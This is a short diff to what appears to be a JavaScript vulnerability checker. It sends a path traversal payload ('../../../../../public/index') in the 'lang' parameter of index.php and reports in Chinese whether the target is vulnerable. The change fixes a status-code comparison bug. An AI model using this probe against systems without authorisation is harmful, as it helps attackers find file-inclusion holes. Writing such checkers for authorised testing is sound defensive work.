@@ -90,7 +90,7 @@ inquirer
   const response_normal = await fetch(`${url}/index.php?lang=AAA`);
   const response = await fetch(`${url}/index.php?lang=../../../../../public/index`);
 
-  if(response_normal.status == 200 && response != 200){
+  if(response_normal.status == 200 && response.status != 200){
     console.log(clc.green.bold(`[+] ${url} 存在该漏洞`))
   }else{
     console.log(clc.yellow(`[-] ${url} 不存在该漏洞`))
